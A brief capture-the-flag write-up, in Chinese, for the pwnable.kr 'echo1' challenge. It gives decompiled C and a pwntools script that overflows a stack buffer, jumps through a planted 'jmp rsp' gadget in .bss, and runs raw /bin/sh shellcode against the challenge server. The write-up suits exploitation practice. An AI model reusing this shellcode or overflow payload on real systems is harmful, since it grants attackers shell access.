# echo1

64bit 

echo1 buf，可控 ret，但是沒有現成的東西可以跳，所以要自己塞 shellcode

前面 main 吃 input 24bytes，bss -> input

一開始讓input 存著 `jmp rsp`

可以 讓 ehco ret 跳到 bss ，bss 在跳上 rsp 也就是 shellcode 的地方

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int *v3; // rsi@1
  _QWORD *v4; // rax@1
  unsigned int v6; // [rsp+Ch] [rbp-24h]@1
  __int64 v7; // [rsp+10h] [rbp-20h]@1
  __int64 v8; // [rsp+18h] [rbp-18h]@1
  __int64 v9; // [rsp+20h] [rbp-10h]@1

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  o = malloc(0x28uLL);
  *((_QWORD *)o + 3) = greetings;
  *((_QWORD *)o + 4) = byebye;
  printf("hey, what's your name? : ", 0LL);
  v3 = (unsigned int *)&v7;
  __isoc99_scanf("%24s", &v7);
  v4 = o;
  *(_QWORD *)o = v7;
  v4[1] = v8;
  v4[2] = v9;
  id = v7;
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  v6 = 0;
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ", v3);
        v3 = &v6;
        __isoc99_scanf("%d", &v6);
        getchar();
        if ( v6 > 3 )
          break;
        ((void (__fastcall *)(const char *, unsigned int *))func[(unsigned __int64)(v6 - 1)])("%d", &v6);
      }
      if ( v6 == 4 )
        break;
      puts("invalid menu");
    }
    cleanup("%d", &v6);
    printf("Are you sure you want to exit? (y/n)");
    v6 = getchar();
  }
  while ( v6 != 121 );
  puts("bye");
  return 0;
}

__int64 echo1()
{
  char s; // [rsp+0h] [rbp-20h]@1

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(&s, 128);
  puts(&s);
  (*((void (__fastcall **)(void *, signed __int64))o + 4))(o, 128LL);
  return 0LL;
}
```

exploit

```python
from pwn import *
 
context(log_level = 'debug')
 
p=remote('pwnable.kr',9010)
# p=process("./echo1")
 
# shellcode = asm(shellcraft.sh())
shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

bss_input=0x6020A0
 
payload= b"A"*0x28 + p64(bss_input) + shellcode

p.recvuntil(": ")
# p.sendline(asm("jmp rsp"))
p.sendline("\xff\xe4")

 
p.recvuntil("> ")
p.sendline('1')
 
p.recvuntil("hello")
p.sendline(payload)
 
p.interactive("inter:")
```